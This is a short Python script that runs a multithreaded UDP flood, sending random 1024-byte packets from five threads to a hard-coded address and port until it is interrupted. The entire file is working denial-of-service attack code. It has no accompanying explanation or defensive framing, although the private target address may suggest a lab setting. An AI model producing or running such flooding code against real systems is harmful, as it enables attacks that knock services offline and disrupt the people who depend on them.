import socket
import threading
import time
import os

TARGET_IP = "192.168.1.100"
TARGET_PORT = 80
NUM_THREADS = 5

PAYLOAD = os.urandom(1024) 

stop_flag = False

def flood(thread_id):
    """Worker function to send packets continuously."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print(f"[Thread {thread_id}] Started flooding {TARGET_IP}:{TARGET_PORT}...")
    
    packet_count = 0
    while not stop_flag:
        try:
            sock.sendto(PAYLOAD, (TARGET_IP, TARGET_PORT))
            packet_count += 1
        except Exception as e:
            print(f"[Thread {thread_id}] Error: {e}")
            break
            
    sock.close()
    print(f"[Thread {thread_id}] Stopped. Sent ~{packet_count} packets.")

def main():
    global stop_flag
    print(f"Starting UDP flood on {TARGET_IP}:{TARGET_PORT} with {NUM_THREADS} threads.")
    print("Press Ctrl+C to stop.")
    
    threads = []
    
    for i in range(NUM_THREADS):
        t = threading.Thread(target=flood, args=(i+1,))
        t.daemon = True
        threads.append(t)
        t.start()
        
    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\nStopping flood... Please wait for threads to close.")
        stop_flag = True
        
    for t in threads:
        t.join(timeout=1.0)
        
    print("Flooding stopped.")

if __name__ == "__main__":
    main()
